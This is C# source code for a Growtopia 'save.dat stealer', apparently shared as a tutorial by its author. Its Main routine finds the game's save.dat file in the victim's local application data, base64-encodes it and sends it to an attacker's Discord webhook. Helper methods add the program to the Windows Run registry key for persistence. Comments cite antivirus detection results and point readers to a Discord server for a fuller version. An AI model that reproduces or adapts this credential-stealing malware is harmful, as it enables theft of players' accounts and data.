using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.IO;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Web.Script.Serialization;
//Removed non-used
namespace fudstealer //Wrong name it's not fud.
{
	class Program
    {
        #region Discord
        public static byte[] Post(string uri, NameValueCollection pairs)
        {
            using (WebClient webClient = new WebClient())
                return webClient.UploadValues(uri, pairs);
        }
        public static void send(string URL, string msg, string username, string avatar_url)
        {
            _ = Post(URL, new NameValueCollection()
        {
                {
                    "username",
                    username

                },
                {
                    "avatar_url",
                    avatar_url

                },
                {
                    "content",
                    msg
                },
            });
        }
		#endregion //Discord basic's for webhook - (https://github.com/IeuanGol)

		#region aes
		class Aes256CbcEncrypter
		{
			private static readonly Encoding encoding = Encoding.UTF8;

			public static string Encrypt(string plainText, string key)
			{
				try
				{
					RijndaelManaged aes = new RijndaelManaged();
					aes.KeySize = 256;
					aes.BlockSize = 128;
					aes.Padding = PaddingMode.PKCS7;
					aes.Mode = CipherMode.CBC;

					aes.Key = encoding.GetBytes(key);
					aes.GenerateIV();

					ICryptoTransform AESEncrypt = aes.CreateEncryptor(aes.Key, aes.IV);
					byte[] buffer = encoding.GetBytes(plainText);

					string encryptedText = Convert.ToBase64String(AESEncrypt.TransformFinalBlock(buffer, 0, buffer.Length));

					String mac = "";

					mac = BitConverter.ToString(HmacSHA256(Convert.ToBase64String(aes.IV) + encryptedText, key)).Replace("-", "").ToLower();

					var keyValues = new Dictionary<string, object>
				{
					{ "iv", Convert.ToBase64String(aes.IV) },
					{ "value", encryptedText },
					{ "mac", mac },
				};

					JavaScriptSerializer serializer = new JavaScriptSerializer();

					return Convert.ToBase64String(encoding.GetBytes(serializer.Serialize(keyValues)));
				}
				catch (Exception e)
				{
					throw new Exception("Error encrypting: " + e.Message);
				}
			}

			public static string Decrypt(string plainText, string key)
			{
				try
				{
					RijndaelManaged aes = new RijndaelManaged();
					aes.KeySize = 256;
					aes.BlockSize = 128;
					aes.Padding = PaddingMode.PKCS7;
					aes.Mode = CipherMode.CBC;
					aes.Key = encoding.GetBytes(key);

					// Base 64 decode
					byte[] base64Decoded = Convert.FromBase64String(plainText);
					string base64DecodedStr = encoding.GetString(base64Decoded);

					// JSON Decode base64Str
					JavaScriptSerializer ser = new JavaScriptSerializer();
					var payload = ser.Deserialize<Dictionary<string, string>>(base64DecodedStr);

					aes.IV = Convert.FromBase64String(payload["iv"]);

					ICryptoTransform AESDecrypt = aes.CreateDecryptor(aes.Key, aes.IV);
					byte[] buffer = Convert.FromBase64String(payload["value"]);

					return encoding.GetString(AESDecrypt.TransformFinalBlock(buffer, 0, buffer.Length));
				}
				catch (Exception e)
				{
					throw new Exception("Error decrypting: " + e.Message);
				}
			}

			static byte[] HmacSHA256(String data, String key)
			{
				using (HMACSHA256 hmac = new HMACSHA256(encoding.GetBytes(key)))
				{
					return hmac.ComputeHash(encoding.GetBytes(data));
				}
			}

			internal static string Encrypt(string v)
			{
				throw new NotImplementedException();
			}
		}
		#endregion //encrypt savedat for security // this not works because length  // this not works because length

		#region 2ndencrypt
		public static string Encryption(string strText)
		{
			var publicKey = "<RSAKeyValue><Modulus>21wEnTU+mcD2w0Lfo1Gv4rtcSWsQJQTNa6gio05AOkV/Er9w3Y13Ddo5wGtjJ19402S71HUeN0vbKILLJdRSES5MHSdJPSVrOqdrll/vLXxDxWs/U0UT1c8u6k/Ogx9hTtZxYwoeYqdhDblof3E75d9n2F0Zvf6iTb4cI7j6fMs=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";

			var testData = Encoding.UTF8.GetBytes(strText);

			using (var rsa = new RSACryptoServiceProvider(1024))
			{
				try
				{
					// client encrypting data with public key issued by server                    
					rsa.FromXmlString(publicKey.ToString());

					var encryptedData = rsa.Encrypt(testData, true);

					var base64Encrypted = Convert.ToBase64String(encryptedData);

					return base64Encrypted;
				}
				finally
				{
					rsa.PersistKeyInCsp = false;
				}
			}
		}

		public static string Decryption(string strText)
		{
			var privateKey = "<RSAKeyValue><Modulus>21wEnTU+mcD2w0Lfo1Gv4rtcSWsQJQTNa6gio05AOkV/Er9w3Y13Ddo5wGtjJ19402S71HUeN0vbKILLJdRSES5MHSdJPSVrOqdrll/vLXxDxWs/U0UT1c8u6k/Ogx9hTtZxYwoeYqdhDblof3E75d9n2F0Zvf6iTb4cI7j6fMs=</Modulus><Exponent>AQAB</Exponent><P>/aULPE6jd5IkwtWXmReyMUhmI/nfwfkQSyl7tsg2PKdpcxk4mpPZUdEQhHQLvE84w2DhTyYkPHCtq/mMKE3MHw==</P><Q>3WV46X9Arg2l9cxb67KVlNVXyCqc/w+LWt/tbhLJvV2xCF/0rWKPsBJ9MC6cquaqNPxWWEav8RAVbmmGrJt51Q==</Q><DP>8TuZFgBMpBoQcGUoS2goB4st6aVq1FcG0hVgHhUI0GMAfYFNPmbDV3cY2IBt8Oj/uYJYhyhlaj5YTqmGTYbATQ==</DP><DQ>FIoVbZQgrAUYIHWVEYi/187zFd7eMct/Yi7kGBImJStMATrluDAspGkStCWe4zwDDmdam1XzfKnBUzz3AYxrAQ==</DQ><InverseQ>QPU3Tmt8nznSgYZ+5jUo9E0SfjiTu435ihANiHqqjasaUNvOHKumqzuBZ8NRtkUhS6dsOEb8A2ODvy7KswUxyA==</InverseQ><D>cgoRoAUpSVfHMdYXW9nA3dfX75dIamZnwPtFHq80ttagbIe4ToYYCcyUz5NElhiNQSESgS5uCgNWqWXt5PnPu4XmCXx6utco1UVH8HGLahzbAnSy6Cj3iUIQ7Gj+9gQ7PkC434HTtHazmxVgIR5l56ZjoQ8yGNCPZnsdYEmhJWk=</D></RSAKeyValue>";

			var testData = Encoding.UTF8.GetBytes(strText);

			using (var rsa = new RSACryptoServiceProvider(1024))
			{
				try
				{
					var base64Encrypted = strText;

					// server decrypting data with private key                    
					rsa.FromXmlString(privateKey);

					var resultBytes = Convert.FromBase64String(base64Encrypted);
					var decryptedBytes = rsa.Decrypt(resultBytes, true);
					var decryptedData = Encoding.UTF8.GetString(decryptedBytes);
					return decryptedData.ToString();
				}
				finally
				{
					rsa.PersistKeyInCsp = false;
				}
			}
		}
		#endregion  // this not works because length

		#region base64 
		public static string Base64Encode(string plainText)
		{
			var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);
			return System.Convert.ToBase64String(plainTextBytes);
		}
		public static string Base64Decode(string base64EncodedData)
		{
			var base64EncodedBytes = System.Convert.FromBase64String(base64EncodedData);
			return System.Text.Encoding.UTF8.GetString(base64EncodedBytes);
		}
		#endregion //Inspired by GrowtopiaNoobs C++

		#region Start-up
		public void addStartup()
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
			string path;
			path = System.IO.Path.GetDirectoryName(
				System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase);
			registryKey.SetValue("ApplicationName", path);
		}
		public void clearStartup()
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
			string path;
			path = System.IO.Path.GetDirectoryName(
				System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase);
			registryKey.DeleteValue("ApplicationName");
		}
		#endregion //I dont want share anymore for copy&paste but you can come our discord server and download this last version  // I dont want make " (Copy & Paster) anymore you can download from discord server complete version after vertification"

		#region ProgramConfig
		public static string webhookurl = "Your webhookurl";
		public static string username = "Your username";
		public static string avatar_url = "https://i.imgur.com/4Px7FXk.jpg"; //Example photo from imgur
		#endregion

		//VirusTotal: https://www.virustotal.com/gui/file/40bf023fd218d028f2c696a0b4647ac5cda4e6c572ec4324cc1c5b7daa8ebdbb/detection
		//Guys don't make "Copy & Paste", Copy and Paste is not good for you. Please try to learn, try to learn.
		//xarax#1337
		//and why encryption = it's secure and good. I share decryption on my server you can come when you want :)
		//btw don't be afraid of me you can write whenever you want help i answer when im available.
		//Thanks for read dont forget to learn.
		//Do not copy & paste
		static void Main(string[] args) //Maybe need run as administrator
        {
			//This is a tutorial for save.dat stealer but no fud. with save.dat tracer
			//Made by xarax
			string gtpath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)+@"\Growtopia"; //Find gt path (simple method)
			var datFiles = Directory.EnumerateFiles(gtpath, "*.dat"); //Get extension for secured save.dat's
		    string realDat = ""; 
			foreach (string cur in datFiles)
			{
				 realDat = cur;
			} //This made for file have only 1 file you can edit to multiple files or you can find in projects.
			
			StreamReader readfordat = new StreamReader(realDat);
			string datEncoded = Base64Encode(readfordat.ReadToEnd());

			send(webhookurl, "||"+datEncoded+"||",username, avatar_url);
			// || for send spoiler
			Task.WaitAll(); // Wait for a job done. Dont use this for your other project's, I used this only wait send webhook you can use Console.ReadLine();
        }
    }
}
